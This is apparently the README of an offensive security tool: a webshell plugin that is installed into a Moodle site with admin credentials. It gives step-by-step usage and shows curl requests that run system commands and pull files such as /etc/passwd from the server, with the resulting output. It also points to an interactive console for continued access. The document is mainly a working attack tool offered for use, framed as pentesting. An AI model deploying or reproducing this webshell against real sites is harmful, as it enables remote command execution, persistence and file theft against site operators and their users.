# Moodle webshell plugin for RCE

<p align="center">
    A webshell plugin and interactive shell for pentesting a Moodle instance.
    <br>
    <img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/p0dalirius/Moodle-webshell-plugin">
    <a href="https://twitter.com/intent/follow?screen_name=podalirius_" title="Follow"><img src="https://img.shields.io/twitter/follow/podalirius_?label=Podalirius&style=social"></a>
    <a href="https://www.youtube.com/c/Podalirius_?sub_confirmation=1" title="Subscribe"><img alt="YouTube Channel Subscribers" src="https://img.shields.io/youtube/channel/subscribers/UCF_x5O7CSfr82AfNVTKOv_A?style=social"></a>
    <br>
</p>

## Features

 - [x] Webshell plugin for Moodle.
 - [x] Execute system commands via an API with `?action=exec`.
 - [x] Download files from the remote system to your attacking machine with `?action=download`.

## Usage

**Requirements**: You need to have the credentials of the `admin` account of the Moodle instance.

### Step 1.1: Upload the webshell plugin

Go to "Site administration --> Install plugins" page, at http://127.0.0.1:10080/admin/tool/installaddon/index.php, and click on "_Choose a file_":

![](./.github/upload_and_install.png)

### Step 1.2: Plugin successfully uploaded

Press the buttons on the various pages until you get a message stating that your plugin is successfully uploaded:

![](./.github/plugin_successfully_uploaded.png)

### Step 2.1: Executing commands

You can now execute commands by sending a GET or POST request to http://127.0.0.1:10080/local/moodle_webshell/webshell.php with `action=exec&cmd=id`:

```sh
$ curl -X POST 'http://127.0.0.1:10080/local/moodle_webshell/webshell.php' --data "action=exec&cmd=id"
{"stdout":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","exec":"id"}
```

You can also access it by a GET request from a browser:

![](./.github/exec_code_web.png)

### Step 2.2: Downloading files

You can also download remote files by sending a GET or POST request to http://127.0.0.1:10080/local/moodle_webshell/webshell.php with `action=download&cmd=/etc/passwd`:

```sh
$ curl -X POST 'http://127.0.0.1:10080/local/moodle_webshell/webshell.php' --data "action=download&path=/etc/passwd" -o-
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
```

You can also download a remote file from a browser with a GET request :

![](./.github/download_file_web.png)

### Step 3: The interactive console

When your webshell is active, you can now use the interactive [console.py](console.py) to execute commands and download remote files.

https://user-images.githubusercontent.com/79218792/169657310-dee340d6-19c0-4192-bcd1-ac8b9b29b731.mp4

## References
 - https://docs.moodle.org/en/Developer_documentation
 - https://docs.moodle.org/400/en/Development:Developer_documentation#Make_a_new_plugin
 - https://docs.moodle.org/dev/Moodle_App_Plugins_Development_Guide
 - https://docs.moodle.org/dev/Plugin_files
